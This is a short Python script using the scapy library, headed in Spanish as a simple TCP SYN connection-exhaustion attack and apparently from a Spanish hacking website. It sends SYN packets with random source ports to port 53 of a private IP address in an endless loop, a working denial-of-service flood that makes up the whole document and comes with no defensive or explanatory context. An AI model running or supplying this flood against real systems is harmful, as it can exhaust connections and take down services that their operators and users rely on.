#! /usr/bin/env python
# Name : Antonio Taboada
# Website : www.hackingyseguridad.com
# Description : Simple ataque de agotamiento de conexiones TCP SYN
import sys
from scapy.all import *
ip=IP(dst="192.168.1.253",frag=0,ttl=255)
SYN=TCP(sport=RandShort(),dport=53,flags="S",window=29200)
while True:
    send(ip/SYN)
